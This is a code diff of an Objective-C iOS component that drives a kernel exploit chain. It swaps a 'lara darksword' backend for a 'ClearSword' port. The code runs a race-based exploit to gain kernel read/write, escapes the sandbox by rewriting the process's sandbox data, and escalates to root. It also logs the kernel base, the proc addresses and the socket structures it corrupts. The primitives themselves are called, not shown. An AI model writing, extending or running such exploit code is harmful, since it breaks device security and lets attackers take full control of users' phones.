@@ -22,12 +22,11 @@
 #import <string.h>
 #import <dlfcn.h>
 
-#import "darksword.h"     // lara: ds_run / ds_is_ready / ds_kread* / kernel_base
-#import "utils.h"         // lara: ourproc / procbypid / init_offsets
-#import "sbx.h"           // lara: sbx_escape 沙盒逃逸
-#import "offsets.h"       // lara: offsets_init()（按版本/机型填 off_* 全局量）
-#import "DSEscape.h"      // 回退路线：cred 定位 + lara 的 offsets/S() 链路
-#import "machine_info.h"  // CPU 家族宏（随 lara 目录带过来的一份常量头）
+#import "DSEscape.h"
+#import "common.h"        // ClearSword 上下文（g_ctx / g_offsets）
+#import "poc.h"           // clearsword_run
+#import "krw.h"           // early_kread64 等原语
+#import "machine_info.h"  // CPU 家族宏
 
 #pragma mark - 状态
 
@@ -146,10 +145,10 @@ static inline BOOL ds_is_kernel_address(uint64_t address)
     return (address & 0xfffff00000000000ULL) == 0xfffff00000000000ULL;
 }
 
-/// 漏洞跑完之后，先确认真的拿到了可用的 socket，再碰内核（lara 自己提供了 ready 标志）
+/// 漏洞跑完之后，先确认真的拿到了可用的 socket，再碰内核
 static BOOL ds_kernel_rw_healthy(void)
 {
-    return ds_is_ready();
+    return ds_is_kernel_address(g_ctx.rw_socket_pcb) || ds_is_kernel_address(g_ctx.control_socket_pcb);
 }
 
 #pragma mark - 探针
@@ -257,12 +256,12 @@ static uint32_t ds_cpu_family(void)
 + (BOOL)isExploitDone { return gExploitDone; }
 + (BOOL)isRunningAsRoot { return getuid() == 0; }
 + (BOOL)probeFilesystemAccess { return ds_probe_write_access(); }
-+ (unsigned long long)kernelBase { return (unsigned long long)kernel_base; }
++ (unsigned long long)kernelBase { return DSEscapeKernelBase(); }
 
 + (NSString *)diagnosticsText
 {
     NSMutableString *text = [NSMutableString string];
-    [text appendFormat:@"后端: lara darksword + pe/sbx_escape\n"];
+    [text appendFormat:@"后端: ClearSword (DarkSword C port)\n"];
     [text appendFormat:@"机型: %@\n", [self deviceModelIdentifier]];
     [text appendFormat:@"系统: %@\n", [self systemVersion]];
     [text appendFormat:@"芯片: %@\n", [self cpuFamilyName]];
@@ -271,12 +270,13 @@ static uint32_t ds_cpu_family(void)
     [text appendFormat:@"内核读写已拿到: %@\n", gExploitDone ? @"是" : @"否"];
     [text appendFormat:@"沙盒已逃逸: %@\n", gEscaped ? @"是" : @"否"];
     [text appendFormat:@"当前 uid: %d (%@)\n", getuid(), [self isRunningAsRoot] ? @"root" : @"非 root"];
-    [text appendFormat:@"内核基址: 0x%llx（slide 0x%llx）\n",
-        (unsigned long long)kernel_base, (unsigned long long)kernel_slide];
-    [text appendFormat:@"ds_is_ready: %d / rw_socket: %d / control_socket: %d\n",
-        (int)ds_is_ready(), rw_socket, control_socket];
-    [text appendFormat:@"rw_socket_pcb: 0x%llx\n", (unsigned long long)ds_get_rw_socket_pcb()];
-    [text appendFormat:@"本进程 proc: 0x%llx\n", (unsigned long long)ds_get_our_proc()];
+    [text appendFormat:@"内核基址: 0x%llx\n", DSEscapeKernelBase()];
+    [text appendFormat:@"self proc: 0x%llx\n", DSEscapeSelfProc()];
+    [text appendFormat:@"扫出的 thread_t_tro: 0x%llx\n", DSEscapeThreadTroOffset()];
+    [text appendFormat:@"rw_socket_pcb: 0x%llx / control_socket_pcb: 0x%llx\n",
+        (unsigned long long)g_ctx.rw_socket_pcb, (unsigned long long)g_ctx.control_socket_pcb];
+    [text appendFormat:@"race 计数: highiest_success_idx=%llu success_read_count=%llu\n",
+        (unsigned long long)g_ctx.highiest_success_idx, (unsigned long long)g_ctx.success_read_count];
     [text appendFormat:@"现场探针写盘: %@\n", ds_probe_write_access() ? @"通过" : @"失败"];
     if (gLastError) [text appendFormat:@"上一次错误: %@\n", gLastError.localizedDescription];
     return text;
@@ -319,24 +319,21 @@ static uint32_t ds_cpu_family(void)
             gExploitAttempted = YES;
             if (log) log([NSString stringWithFormat:@"[DSFile] 目标: %@ / iOS %@ / %@",
                           [self deviceModelIdentifier], [self systemVersion], [self cpuFamilyName]]);
-            if (log) log(@"[DSFile] 开始执行内核漏洞（lara darksword 后端，可能耗时数秒，界面短暂无响应属正常）…");
+            if (log) log(@"[DSFile] 开始执行内核漏洞（ClearSword 后端，可能耗时数秒，界面短暂无响应属正常）…");
 
             int kret = 1;
             @try {
-                // lara 的 off_* / PROC_PID_OFFSET 等全局量必须先由 init_offsets() / offsets_init() 填好，
-                // 否则 darksword 的漏洞代码会拿着 0 偏移去读写内核。
-                init_offsets();
-                offsets_init();
-                kret = ds_run();
+                kret = clearsword_run();
             } @catch (NSException *e) {
                 if (log) log([NSString stringWithFormat:@"[DSFile] 漏洞抛出异常: %@", e.reason]);
                 kret = -1;
             }
 
             if (log) log([NSString stringWithFormat:
-                          @"[DSFile] 漏洞返回 %d；kernel_base=0x%llx（slide 0x%llx）；ds_is_ready=%d；rw_socket=%d",
-                          kret, (unsigned long long)kernel_base, (unsigned long long)kernel_slide,
-                          (int)ds_is_ready(), rw_socket]);
+                          @"[DSFile] 漏洞返回 %d；kernel_base=0x%llx；race 计数 highiest=%llu success=%llu",
+                          kret, DSEscapeKernelBase(),
+                          (unsigned long long)g_ctx.highiest_success_idx,
+                          (unsigned long long)g_ctx.success_read_count]);
 
             if (kret != 0) {
                 if (log) log(@"[DSFile] 内核漏洞没有成功（race 失败是最常见原因）。"
@@ -347,7 +344,7 @@ static uint32_t ds_cpu_family(void)
             } else {
                 gExploitDone = YES;
                 if (log) log([NSString stringWithFormat:@"[DSFile] 内核读写已获得，kernel base = 0x%llx",
-                              (unsigned long long)kernel_base]);
+                              DSEscapeKernelBase()]);
                 result = [self ds_escapeStepWithLog:log];
             }
         }
@@ -386,42 +383,25 @@ static uint32_t ds_cpu_family(void)
 {
     if (!ds_kernel_rw_healthy()) {
         if (log) log([NSString stringWithFormat:
-                      @"[DSFile] 内核读写不可用（ds_is_ready=%d，rw_socket=%d）。"
+                      @"[DSFile] 内核读写不可用：rw_socket_pcb=0x%llx control_socket_pcb=0x%llx 都不是合法内核地址。"
                        "请完全退出 App 重开后再点一次「激活内核访问」。",
-                      (int)ds_is_ready(), rw_socket]);
+                      (unsigned long long)g_ctx.rw_socket_pcb,
+                      (unsigned long long)g_ctx.control_socket_pcb]);
         gLastError = [NSError errorWithDomain:@"DSFile" code:DSKernelResultExploitFailed
                                      userInfo:@{ NSLocalizedDescriptionKey: @"内核读写不可用，请退出 App 重开后重试" }];
         return DSKernelResultExploitFailed;
     }
 
-    if (log) log(@"[DSFile] 开始改写本进程沙盒数据（lara sbx_escape）…");
+    if (log) log(@"[DSFile] 开始改写本进程沙盒数据…");
     gEscapeLogBridge = [log copy];
-    sbx_setlogcallback(ds_escape_log_bridge);
-
-    uint64_t selfProc = 0;
-    @try {
-        selfProc = ds_get_our_proc();
-    } @catch (NSException *e) {
-        if (log) log([NSString stringWithFormat:@"[DSFile] 取本进程 proc 异常: %@", e.reason]);
-    }
-    if (log) log([NSString stringWithFormat:@"[DSFile] 本进程 proc = 0x%llx", (unsigned long long)selfProc]);
 
     int sret = 1;
     @try {
-        if (selfProc != 0) {
-            sret = sbx_escape(selfProc);
-        } else {
-            // lara 的 proc 恢复（procbysock*）依赖 so_background_thread，本机（18.5/A14）恒为 0，
-            // 大概率拿不到 proc；这时回退到我们自己的 cred 定位 + lara 的 offsets/S() 链路。
-            if (log) log(@"[DSFile] lara ds_get_our_proc() 返回 0，回退到内置 cred 定位 + 沙盒链路…");
-            gEscapeLogBridge = [log copy];
-            sret = DSEscapeSandbox(ds_escape_log_bridge);
-        }
+        sret = DSEscapeSandbox(ds_escape_log_bridge);
     } @catch (NSException *e) {
         if (log) log([NSString stringWithFormat:@"[DSFile] 沙盒改写异常: %@", e.reason]);
         sret = -9;
     }
-    sbx_setlogcallback(NULL);
     gEscapeLogBridge = nil;
     if (log) log([NSString stringWithFormat:@"[DSFile] 沙盒改写返回 %d", sret]);
 
@@ -450,8 +430,7 @@ static uint32_t ds_cpu_family(void)
 
     int ret = -1;
     @try {
-        // lara 自己的 sbx_elevate 被它们标注为 broken；这里照用，失败也不影响已获得的沙盒逃逸
-        ret = sbx_elevate();
+        ret = DSEscapeElevateToRoot(ds_escape_log_bridge);
     } @catch (NSException *e) {
         if (log) log([NSString stringWithFormat:@"[DSFile] 提权异常: %@", e.reason]);
         ret = -1;
